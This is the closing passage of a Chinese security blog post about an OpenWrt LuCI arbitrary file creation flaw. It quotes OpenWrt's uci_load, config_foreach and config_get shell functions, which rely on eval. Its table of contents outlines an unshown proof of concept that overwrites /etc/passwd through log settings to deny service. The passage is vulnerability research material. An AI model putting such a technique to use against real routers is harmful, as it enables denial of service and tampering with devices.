<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config_load() &#123;</span><br><span class="line">        [ -n &quot;$IPKG_INSTROOT&quot; ] &amp;&amp; return 0</span><br><span class="line">        uci_load &quot;$@&quot;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>/lib/config/uci.sh</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">uci_load</span></span>() &#123;                                                                  </span><br><span class="line">        <span class="built_in">local</span> PACKAGE=<span class="string">&quot;<span class="variable">$1</span>&quot;</span>                                                    </span><br><span class="line">        <span class="built_in">local</span> DATA                                                            </span><br><span class="line">        <span class="built_in">local</span> RET                                                             </span><br><span class="line">        <span class="built_in">local</span> VAR                                                             </span><br><span class="line">                                                                              </span><br><span class="line">        _C=0                                                                  </span><br><span class="line">        <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$CONFIG_APPEND</span>&quot;</span> ]; <span class="keyword">then</span>                                      </span><br><span class="line">                <span class="keyword">for</span> VAR <span class="keyword">in</span> <span class="variable">$CONFIG_LIST_STATE</span>; <span class="keyword">do</span>                             </span><br><span class="line">                        <span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> CONFIG_<span class="variable">$&#123;VAR&#125;</span>=       </span><br><span class="line">                        <span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> CONFIG_<span class="variable">$&#123;VAR&#125;</span>_LENGTH=    </span><br><span class="line">                <span class="keyword">done</span>                                                          </span><br><span class="line">                <span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> CONFIG_LIST_STATE=           </span><br><span class="line">                <span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> CONFIG_SECTIONS=                      </span><br><span class="line">                <span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> CONFIG_NUM_SECTIONS=0                 </span><br><span class="line">                <span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> CONFIG_SECTION=                       </span><br><span class="line">        <span class="keyword">fi</span>                                                                    </span><br><span class="line">                                                                              </span><br><span class="line">        DATA=<span class="string">&quot;<span class="subst">$(/sbin/uci $&#123;UCI_CONFIG_DIR:+-c $UCI_CONFIG_DIR&#125; $&#123;LOAD_STATE:+</span></span></span><br><span class="line"><span class="string"><span class="subst">        RET=<span class="string">&quot;$?&quot;</span>                                                              </span></span></span><br><span class="line"><span class="string"><span class="subst">        [ <span class="string">&quot;<span class="variable">$RET</span>&quot;</span> != 0 -o -z <span class="string">&quot;<span class="variable">$DATA</span>&quot;</span> ] || eval <span class="string">&quot;<span class="variable">$DATA</span>&quot;</span>                         </span></span></span><br><span class="line"><span class="string"><span class="subst">        unset DATA                                                            </span></span></span><br><span class="line"><span class="string"><span class="subst">                                                                              </span></span></span><br><span class="line"><span class="string"><span class="subst">        $&#123;CONFIG_SECTION:+config_cb&#125;                                          </span></span></span><br><span class="line"><span class="string"><span class="subst">        return <span class="string">&quot;<span class="variable">$RET</span>&quot;</span>                                                         </span></span></span><br><span class="line"><span class="string"><span class="subst">&#125;</span></span></span><br></pre></td></tr></table></figure>
<h3 id="config-foreach"><a href="#config-foreach" class="headerlink" title="config_foreach"></a>config_foreach</h3><p>/lib/functions.sh</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">config_foreach</span></span>() &#123;</span><br><span class="line">true<span class="built_in">local</span> ___function=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">true[ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ge 1 ] &amp;&amp; <span class="built_in">shift</span></span><br><span class="line">true<span class="built_in">local</span> ___type=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">true[ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ge 1 ] &amp;&amp; <span class="built_in">shift</span></span><br><span class="line">true<span class="built_in">local</span> section cfgtype</span><br><span class="line"></span><br><span class="line">true[ -z <span class="string">&quot;<span class="variable">$CONFIG_SECTIONS</span>&quot;</span> ] &amp;&amp; <span class="built_in">return</span> 0</span><br><span class="line">true<span class="keyword">for</span> section <span class="keyword">in</span> <span class="variable">$&#123;CONFIG_SECTIONS&#125;</span>; <span class="keyword">do</span></span><br><span class="line">truetrueconfig_get cfgtype <span class="string">&quot;<span class="variable">$section</span>&quot;</span> TYPE</span><br><span class="line">truetrue[ -n <span class="string">&quot;<span class="variable">$___type</span>&quot;</span> ] &amp;&amp; [ <span class="string">&quot;x<span class="variable">$cfgtype</span>&quot;</span> != <span class="string">&quot;x<span class="variable">$___type</span>&quot;</span> ] &amp;&amp; <span class="built_in">continue</span></span><br><span class="line">truetrue<span class="built_in">eval</span> <span class="string">&quot;<span class="variable">$___function</span> \&quot;\$section\&quot; \&quot;\$@\&quot;&quot;</span></span><br><span class="line">true<span class="keyword">done</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>config_get</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config_get &lt;variable&gt; &lt;section&gt; &lt;option&gt; [&lt;default&gt;]</span></span><br><span class="line"><span class="comment"># config_get &lt;section&gt; &lt;option&gt;</span></span><br><span class="line"><span class="function"><span class="title">config_get</span></span>() &#123;</span><br><span class="line">true<span class="keyword">case</span> <span class="string">&quot;<span class="variable">$3</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">truetrue<span class="string">&quot;&quot;</span>) <span class="built_in">eval</span> <span class="built_in">echo</span> <span class="string">&quot;\&quot;\$&#123;CONFIG_<span class="variable">$&#123;1&#125;</span>_<span class="variable">$&#123;2&#125;</span>:-\$&#123;4&#125;&#125;\&quot;&quot;</span>;;</span><br><span class="line">truetrue*)  <span class="built_in">eval</span> <span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> -- <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>=\$&#123;CONFIG_<span class="variable">$&#123;2&#125;</span>_<span class="variable">$&#123;3&#125;</span>:-\$&#123;4&#125;&#125;&quot;</span>;;</span><br><span class="line">true<span class="keyword">esac</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/openwrt/openwrt">https://github.com/openwrt/openwrt</a></li>
<li><a target="_blank" rel="noopener" href="https://www.twblogs.net/a/5b7c30352b71770a43d9c644">https://www.twblogs.net/a/5b7c30352b71770a43d9c644</a></li>
</ul>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/2018/04/11/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenWrt-x86-VMware-%E5%AE%89%E8%A3%85"><span class="toc-number">1.</span> <span class="toc-text">OpenWrt x86 VMware 安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">1. 下载镜像文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BD%AC%E6%8D%A2%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">2. 转换镜像文件格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%96%B0%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-number">1.3.</span> <span class="toc-text">3. 新建虚拟机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C"><span class="toc-number">1.4.</span> <span class="toc-text">4.配置网络</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%AA%8C%E8%AF%81%E5%AE%89%E8%A3%85"><span class="toc-number">1.5.</span> <span class="toc-text">5. 验证安装</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenWrt-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">OpenWrt 任意文件创建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">技术分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#logread"><span class="toc-number">2.1.1.</span> <span class="toc-text">logread</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-WEB-%E7%AB%AF%E9%85%8D%E7%BD%AE%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E5%8F%82%E6%95%B0%EF%BC%8C%E4%BC%A0%E9%80%92%E5%88%B0%E5%90%8E%E5%8F%B0"><span class="toc-number">2.1.2.</span> <span class="toc-text">1. WEB 端配置系统日志参数，传递到后台</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%90%8E%E5%8F%B0%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.3.</span> <span class="toc-text">2. 后台处理流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E8%A2%AB%E8%A6%86%E7%9B%96%EF%BC%8COpenWrt%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.1.4.</span> <span class="toc-text">3. 文件被覆盖，OpenWrt拒绝服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">2.2.</span> <span class="toc-text">POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%AE%BE%E7%BD%AE%E6%97%A5%E5%BF%97%E5%A4%A7%E5%B0%8F%E5%92%8C%E8%B7%AF%E5%BE%84"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.设置日志大小和路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%94%9F%E6%88%90-1K-%E4%BB%A5%E4%B8%8A%E7%9A%84%E6%97%A5%E5%BF%97%EF%BC%8C%E8%A6%86%E7%9B%96-etc-passwd"><span class="toc-number">2.2.2.</span> <span class="toc-text">2. 生成 1K 以上的日志，覆盖 &#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-OpenWrt-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%95%88%E6%9E%9C"><span class="toc-number">2.2.3.</span> <span class="toc-text">3.OpenWrt 拒绝服务效果</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%BC%94%E7%A4%BA%E8%A7%86%E9%A2%91"><span class="toc-number">2.2.4.</span> <span class="toc-text">4.演示视频</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%91%E7%A0%96"><span class="toc-number">2.3.</span> <span class="toc-text">救砖</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">3.</span> <span class="toc-text">有意思的内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%88%97%E4%B8%BE"><span class="toc-number">3.1.</span> <span class="toc-text">系统文件目录列举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96"><span class="toc-number">3.2.</span> <span class="toc-text">任意文件覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.3.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%87%E6%80%AA-eavl"><span class="toc-number">3.4.</span> <span class="toc-text">奇怪 eavl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">系统函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#config-load"><span class="toc-number">4.1.</span> <span class="toc-text">config_load</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#config-foreach"><span class="toc-number">4.2.</span> <span class="toc-text">config_foreach</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&text=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&title=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&is_video=false&description=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=OpenWrt LuCi 任意文件创建漏洞 0day&body=Check out this article: http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&title=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&title=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&title=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&title=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&name=OpenWrt LuCi 任意文件创建漏洞 0day&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&text=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2025 Delikely
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/2018/04/11/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({{ JSON.stringify(config) }});
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="{{ src }}">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'G-KX5LMFBRGG', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?4c5298163cee69d0e09ddc06ab1b8104";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->


